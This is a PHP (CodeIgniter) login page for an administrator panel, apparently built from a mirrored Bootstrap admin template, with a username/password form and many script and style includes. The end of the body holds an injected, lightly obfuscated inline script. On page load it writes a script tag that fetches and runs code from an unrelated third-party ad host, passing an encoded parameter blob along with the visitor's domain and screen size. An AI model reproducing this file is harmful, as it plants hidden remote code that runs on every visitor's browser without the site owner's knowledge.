<!DOCTYPE html>
<html>
    
<!-- Mirrored from hubancreative.com/projects/templates/coco/default/login.html by HTTrack Website Copier/3.x [XR&CO'2013], Wed, 08 Apr 2015 02:27:37 GMT -->
<head>
        <meta charset="UTF-8">
        <title>Login | Administrator</title>   
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="description" content="">
        <meta name="keywords" content="coco bootstrap template, coco admin, bootstrap,admin template, bootstrap admin,">
        <meta name="author" content="Huban Creative">

        <!-- Base Css Files -->
        <link href=<?php echo base_url("asset/libs/jqueryui/ui-lightness/jquery-ui-1.10.4.custom.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/bootstrap/css/bootstrap.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/font-awesome/css/font-awesome.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/fontello/css/fontello.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/animate-css/animate.min.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/nifty-modal/css/component.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/magnific-popup/magnific-popup.css"); ?> rel="stylesheet" /> 
        <link href=<?php echo base_url("asset/libs/ios7-switch/ios7-switch.css"); ?> rel="stylesheet" /> 
        <link href=<?php echo base_url("asset/libs/pace/pace.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/sortable/sortable-theme-bootstrap.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/bootstrap-datepicker/css/datepicker.css"); ?> rel="stylesheet" />
        <link href=<?php echo base_url("asset/libs/jquery-icheck/skins/all.css"); ?> rel="stylesheet" />
        <!-- Code Highlighter for Demo -->
        <link href=<?php echo base_url("asset/libs/prettify/github.css") ?> rel="stylesheet" />
        
                <!-- Extra CSS Libraries Start -->
        <link href=<?php echo base_url("asset/css/style.css") ?> rel="stylesheet" type="text/css" />
                <!-- Extra CSS Libraries End -->
        <link href=<?php echo base_url("assets/css/style-responsive.css") ?> rel="stylesheet" />

        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->

        <link rel="shortcut icon" href=<?php echo base_url("asset/img/favicon.ico"); ?>>
        <link rel="apple-touch-icon" href=<?php echo base_url("asset/img/apple-touch-icon.png") ?> />
        <link rel="apple-touch-icon" sizes="57x57" href=<?php echo base_url("asset/img/apple-touch-icon-57x57.png"); ?> />
        <link rel="apple-touch-icon" sizes="72x72" href=<?php echo base_url("asset/img/apple-touch-icon-72x72.png"); ?> />
        <link rel="apple-touch-icon" sizes="76x76" href=<?php echo base_url("asset/img/apple-touch-icon-76x76.png"); ?> />
        <link rel="apple-touch-icon" sizes="114x114" href=<?php echo base_url("asset/img/apple-touch-icon-114x114.png"); ?> />
        <link rel="apple-touch-icon" sizes="120x120" href=<?php echo base_url("asset/img/apple-touch-icon-120x120.png" ); ?>/>
        <link rel="apple-touch-icon" sizes="144x144" href=<?php echo base_url("asset/img/apple-touch-icon-144x144.png" ); ?>/>
        <link rel="apple-touch-icon" sizes="152x152" href=<?php echo base_url("asset/img/apple-touch-icon-152x152.png"); ?> />
    </head>
    <body class="fixed-left login-page">

	<div class="container">
		<div class="full-content-center">
			<div class="login-wrap animated flipInX">
				<div class="login-block">

 					<?php if ($this->session->flashdata('alert')): ?>
                        <div class="alert alert-danger">
                        <?php echo $this->session->flashdata('alert'); ?>
                        </div>
                    <?php endif; ?>

					<img src=<?php echo base_url("asset/img/default-user.png") ?> class="img-circle not-logged-avatar">
					<?php echo form_open('xxdlog/auth'); ?>
						<div class="form-group login-input">
						<i class="fa fa-user overlay"></i>
						<input type="text" name="username" class="form-control text-input" placeholder="Username">
						</div>
						<div class="form-group login-input">
						<i class="fa fa-key overlay"></i>
						<input type="password" name="password" class="form-control text-input" placeholder="********">
						</div>
						
						<div class="row">
							<div class="col-sm-12">
							<button type="submit" class="btn btn-success btn-block">LOGIN</button>
							</div>
						</div>
					<?php echo form_close(); ?>
				</div>
			</div>
			
		</div>
	</div>
	<!-- the overlay modal element -->
	<div class="md-overlay"></div>
	<!-- End of eoverlay modal -->
	<script>
		var resizefunc = [];
	</script>
	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src=<?php echo base_url("asset/libs/jquery/jquery-1.11.1.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap/js/bootstrap.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jqueryui/jquery-ui-1.10.4.custom.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-ui-touch/jquery.ui.touch-punch.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-detectmobile/detect.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-animate-numbers/jquery.animateNumbers.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/ios7-switch/ios7.switch.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/fastclick/fastclick.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-blockui/jquery.blockUI.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-bootbox/bootbox.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-slimscroll/jquery.slimscroll.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-sparkline/jquery-sparkline.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/nifty-modal/js/classie.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/nifty-modal/js/modalEffects.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/sortable/sortable.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-fileinput/bootstrap.file-input.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-select/bootstrap-select.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-select2/select2.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/magnific-popup/jquery.magnific-popup.min.js"); ?>></script> 
	<script src=<?php echo base_url("asset/libs/pace/pace.min.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/bootstrap-datepicker/js/bootstrap-datepicker.js"); ?>></script>
	<script src=<?php echo base_url("asset/libs/jquery-icheck/icheck.min.js"); ?>></script>


	<!-- Demo Specific JS Libraries -->
	<script src=<?php echo base_url("asset/libs/prettify/prettify.js") ?>></script>

	<script src=<?php echo base_url("asset/js/init.js") ?>></script>
	<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRYPNXr49aVzOI7AQ2FlkO4%2fSvNZ6%2bqy5ZpY62nLX7Mmic95UPc8iyIfeDy3aUmrQBFuGYvdS8GqYVrhixLFbWBSzc8eLVuM34Sx%2fFw7vkBTeSxbkAfB%2f5QcmAE%2bn%2ff%2b%2foktwPu5CcN25PF1K7%2fj9BOn5RI45IJdunQNupcUmrQxuLFFPKLAlKt%2fI5id%2fLJg2eqGoAuojgV1FrTZD108hHdyVQAXx5G%2b%2f1muHxOfO2qJqT6uxcjjP7f9epk2mFePj9QYPc3IBE%2bWIeij64mce%2bUtFKIPnriUSKGff7iZ2Q0iIwiygEClUBIP%2fHp6WnzTUf6SIUS1pu6TxAfgGRKySjDmpR%2bLg0rYcxpLdEhQEh4bPIvxgjbJtDPl3lLS6oFUs%2fSEHD1BJWeA5UWy25w0%2bB9qFvsXXUTRMbxyRmzjgI4Ei9DvCqaOBbwWWFWMK%2bvMwJr5B2TNQxJRizg6ewrj4dVYjOiWOXHiwfv%2frrLBVhhibUHi2vWcpACvayrHsxrczh%2fLEfPbZSTdw%3d");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>

<!-- Mirrored from hubancreative.com/projects/templates/coco/default/login.html by HTTrack Website Copier/3.x [XR&CO'2013], Wed, 08 Apr 2015 02:27:39 GMT -->
</html>